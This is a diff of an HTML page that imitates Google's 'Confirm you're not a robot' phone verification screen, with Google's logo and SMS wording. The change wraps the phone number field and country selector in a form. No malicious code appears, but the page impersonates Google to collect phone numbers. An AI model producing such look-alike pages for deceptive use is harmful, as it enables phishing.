@@ -4,41 +4,46 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Phone Verify</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0" />
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <main>
         <div class="parent">
             <div class="firstbox">
-                <div class="img-h1">
-                    <img src="images/logo google.jpg" alt="logo">
-                    <h1 class="text-h1">Confirm you're not a robot</h1>
-                </div>
-
-                <div class="main-box1">
-                    <p class="text">
-                        Get a verification code send to your phone
-                    </p>
-               </div>
-
-               <div class="inputbar1">
-                    <select name="town" id="town" class="selectown">CMR  
-                        <option class="option" value="CMR" selected>CMR</option>
-                        <option class="option" value="CMR">France</option>
-                        <option class="option" value="CMR">USA</option>
-                        <option class="option" value="CMR">Deutsh</option>
-                        <option class="option" value="CMR">Spanish</option>
-                    </select>
-                    <input type="email2" name="email address" placeholder="Phone number">
-                    <nav>
-                        <p class="email2">
-                            Google will verify this number via SMS (charges may apply)
+                <form action="" method="post">
+                    <div class="img-h1">
+                        <img src="images/logo google.jpg" alt="logo">
+                        <h1 class="text-h1">Confirm you're not a robot</h1>
+                    </div>
+    
+                    <div class="main-box1">
+                        <p class="text">
+                            Get a verification code send to your phone
                         </p>
-                        <div class="angletag2">
-                            <a href="verify.html" class="nextpage">Next</a>
-                        </div>
-                    </nav>
-               </div>
+                   </div>
+    
+                   <div class="inputbar1">
+                        <select name="select" id="town" class="selectown" required>
+                            <optgroup hidden></optgroup>
+                                <option class="option" value="">CMR</option>
+                                <option class="option" value="">France</option>
+                                <option class="option" value="">USA</option>
+                                <option class="option" value="">Deutsh</option>
+                                <option class="option" value="">Spanish</option>
+                        </select>
+                        <input type="email2" name="email address" placeholder="Phone number" required>
+                        <nav>
+                            <p class="email2">
+                                Google will verify this number via SMS (charges may apply)
+                            </p>
+                            <div class="angletag2">
+                                <a href="verify.html" class="nextpage">Next</a>
+                                <input type="submit" value="Next" href="verify.html">   
+                            </div>
+                        </nav>
+                    </div>
+                </form>
 
            </div>
 
